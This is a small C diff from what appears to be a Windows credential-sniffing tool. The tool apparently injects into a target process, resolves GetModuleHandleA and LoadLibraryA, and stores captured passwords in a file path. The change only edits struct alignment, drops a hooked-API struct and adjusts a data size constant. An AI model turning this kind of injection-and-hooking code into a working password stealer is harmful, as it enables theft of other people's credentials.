@@ -6,7 +6,7 @@
 
 #include "migrate.bin.h"
 
-__declspec(align(16)) typedef struct _sniff_data
+typedef struct _sniff_data
 {
     DWORD64 dwGetModuleHandleA;
     DWORD64 dwLoadLibraryA;
@@ -21,12 +21,7 @@ __declspec(align(16)) typedef struct _sniff_data
     CHAR cPwordFilePath[MAX_PATH];
 } SNIFF_DATA, *PSNIFF_DATA;
 
-__declspec(align(16)) typedef struct _sniff_hooked_data
-{
-    DWORD64 dwWideCharToMultiByte;
-} SNIFF_HOOKED_DATA, *PSNIFF_HOOKED_DATA;
-
-#define MIGRATE_DATA_SIZE 40
+#define MIGRATE_DATA_SIZE 44
 
 DWORD FindTargetPID(LPSTR lpProcName)
 {
